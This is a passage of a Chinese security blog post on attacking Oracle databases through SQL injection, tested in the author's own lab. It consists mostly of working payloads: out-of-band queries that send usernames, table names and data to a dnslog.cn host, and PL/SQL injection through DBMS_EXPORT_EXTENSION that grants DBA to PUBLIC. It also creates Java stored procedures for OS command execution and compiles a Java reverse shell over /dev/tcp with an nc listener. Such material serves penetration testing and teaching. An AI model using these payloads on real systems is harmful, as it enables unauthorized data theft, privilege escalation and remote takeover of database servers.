<h2 id="DNS带外通信注入"><a href="#DNS带外通信注入" class="headerlink" title="DNS带外通信注入"></a>DNS带外通信注入</h2><p>Oracle注入之带外通信和DNSLOG注入非常相似，例如和mysql中load_file()函数实现无回显注入非常相似。</p>
<p>Oracle发送HTTP和DNS请求，并将查询结果带到请求中，然后检测外网服务器的HTTP和DNS日志，从日志中获取查询结果，通过这种方式将繁琐的盲注转换成可以直接获取查询结果的方式。</p>
<p>使用第三方平台，监听访问请求，并记录请求的日志信息，然后使用<code>utl_http.request()</code>向外网主机发送http请求，请求便携带了查询的结果信息。此处可以结合SSRF进行内网探测。或许这就是Oracle的SSRF。</p>
<p>利用<code>utl.inaddr.get_host_address()</code>，将查询结果拼接到域名下，并使用DNS记录解析日志，通过这种方式获取查询结果。</p>
<h3 id="检测是否支持utl-http-request"><a href="#检测是否支持utl-http-request" class="headerlink" title="检测是否支持utl_http.request"></a>检测是否支持utl_http.request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) --+</span><br></pre></td></tr></table></figure>

<p>若页面返回正常，这说明支持utl_http.request</p>
<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select user from dual)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br></pre></td></tr></table></figure>

<h2 id="利用漏洞提权执行命令"><a href="#利用漏洞提权执行命令" class="headerlink" title="利用漏洞提权执行命令"></a>利用漏洞提权执行命令</h2><p>Oracle提权漏洞集中存在于PL/SQL编写的函数、存储过程、包、触发器中。Oracle存在提权漏洞的一个重要原因是PL/SQL定义的两种调用权限导致（定义者权限和调用者权限）。定义者权限给了低权限用户在特定时期拥有高权限的可能，这就给提权操作奠定了基础。</p>
<p>即，无论调用者权限如何，执行存储过程的结果权限永远为定义者权限，因此，如果一个较高权限的用户定义了存储过程，并赋予了低权限用户调用权限，较低权限的用户即可利用这个存储过程提权。</p>
<p>Java作为Oracle公司的主打语言，具有内置的安全性机制和高效的垃圾收集系统。Java还具有一组非常大的、丰富的标准库，从而可以更快、更低成本地开发应用程序。因此Oracle公司在它的Oracle数据库中，同样支持了使用Java来编写存储过程。</p>
<p>那么对于攻击者来说，完全可以通过这一特性，在系统上执行Java代码，从而完成提权操作。</p>
<p><strong>攻击流程</strong>：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061057610.png" alt="859e8d3edbce11899c6415bfac2e25ee.png"></p>
<p><strong>本文测试环境均为</strong>：</p>
<blockquote>
<p>CentOS Linux release 7.2.1511 (Core)</p>
<p>Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production</p>
</blockquote>
<p>执行方式很多种，这边只研究Oracle10g，并且本地实测成功的</p>
<ul>
<li><code>DBMS_EXPORT_EXTENSION()</code></li>
<li><code>dbms_xmlquery.newcontext()</code></li>
<li><code>DBMS_JAVA_TEST.FUNCALL()</code></li>
</ul>
<h3 id="dbms-export-extension"><a href="#dbms-export-extension" class="headerlink" title="dbms_export_extension()"></a>dbms_export_extension()</h3><blockquote>
<ul>
<li>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
<li>权限：None</li>
<li>详情：这个软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询。</li>
</ul>
</blockquote>
<h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>该请求将导致查询”GRANT DBA TO PUBLIC”以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant dba to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h4 id="使用Java执行"><a href="#使用Java执行" class="headerlink" title="使用Java执行"></a>使用Java执行</h4><p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>赋予Java权限</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;begin dbms_java.grant_permission(&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;PUBLIC&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&lt;&gt;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;execute&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>赋予函数执行权限</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant all on LinxRunCMD to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>执行系统命令</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.LinxRunCMD(<span class="string">&#x27;/bin/bash -c /usr/bin/whoami&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061057322.png" alt="46a99a5f54c8a8cbadca2549dd53d9fe.png"></p>
<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext()"></a>dbms_xmlquery.newcontext()</h3><blockquote>
<ul>
<li>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
<li>必须在DBMS_PORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功s</li>
</ul>
</blockquote>
<p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p><strong>赋予当前用户Java权限</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--当前用户查看</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;begin dbms_java.grant_permission(&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;YY&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;execute&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p>通过以下命令可以查看all_objects内部改变：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%LINX%&#x27;</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%Linx%&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061105963.png" alt="image-20211006110557755"></p>
<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p>判断是否创建成功</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="operator">=</span><span class="string">&#x27;LINXRUNCMD&#x27;</span></span><br></pre></td></tr></table></figure>

<img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061106049.png" alt="image-20211006110629889" style="zoom:50%;">

<p>也可通过查看all_objects内部改变判断</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%LINX%&#x27;</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%Linx%&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061107441.png" alt="image-20211006110714309"></p>
<p>若想删除创建的函数，通过以下命令删除</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> LinxRunCMD</span><br></pre></td></tr></table></figure>

<p><strong>执行命令</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> LinxRunCMD(<span class="string">&#x27;id&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061059370.png" alt="2849daa3c5c2ade13eb918a3ca0ad502.png"></p>
<h3 id="dbms-java-test-funcall"><a href="#dbms-java-test-funcall" class="headerlink" title="dbms_java_test.funcall()"></a>dbms_java_test.funcall()</h3><blockquote>
<ul>
<li>影响版本： 10g R2, 11g R1, 11g R2</li>
<li>权限：Java Permissions</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="string">&#x27;main&#x27;</span>,<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;pwd &gt; /tmp/pwd.txt&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p>执行时报如下错</p>
<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061108594.png" alt="5bf9bd61e8d2fa65abe45e7a3506eb08.png"></p>
<p>但不影响命令的执行</p>
<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061108224.png" alt="image-20211006110810998"></p>
<p>该方式无回显，在注入时不太方便利用，但可通过此方式反弹。</p>
<h2 id="Java反弹Shell"><a href="#Java反弹Shell" class="headerlink" title="Java反弹Shell"></a>Java反弹Shell</h2><p>在提权操作中如果遇到无回显情况，如上部分第三种方法，可以通过反弹shell的方式，在自己VPS上利用nc监听端口。以此来执行交互式执行命令（类似带外通信）。</p>
<h3 id="编译payload"><a href="#编译payload" class="headerlink" title="编译payload"></a>编译payload</h3><p>java源代码（linux系统的payload）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shellRev</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                System.out.println(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;run();&#125;</span><br><span class="line">                <span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                String[] aaa=&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 9&lt;&gt; /dev/tcp/192.168.1.50/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&quot;</span>&#125;;</span><br><span class="line">                Process p=Runtime.getRuntime().exec(aaa);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#编译</span><br><span class="line">javac shellRev.java</span><br><span class="line">#执行</span><br><span class="line">java shellRev</span><br></pre></td></tr></table></figure>

<h3 id="使用Java执行-1"><a href="#使用Java执行-1" class="headerlink" title="使用Java执行"></a>使用Java执行</h3><p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace and compile java source named &quot;shell&quot; as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa=&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 9&lt;&gt; /dev/tcp/127.0.0.1/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&quot;&#125;;Process p=Runtime.getRuntime().exec(aaa);&#125;&#125;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>赋予Java权限</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;</span><span class="string">&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;begin dbms_java.grant_permission( &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;PUBLIC&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;SYS:java.net.SocketPermission&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;&gt;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;*&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27; );end;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;;END;&#x27;</span><span class="string">&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) from dual</span><br></pre></td></tr></table></figure>

<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace function reversetcp RETURN VARCHAR2 as language java name &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;shell.run() return String&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>赋予函数执行权限</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant all on reversetcp to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.reversetcp <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>shell命令行输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l p 8080</span><br></pre></td></tr></table></figure>

<img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061110384.png" alt="image-20211006110855525" style="zoom:50%;"></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ulysses</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://plumeria.ltd/post/ec74cb90.html">https://plumeria.ltd/post/ec74cb90.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://plumeria.ltd" target="_blank">Ulysses'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post_share"><div class="social-share" 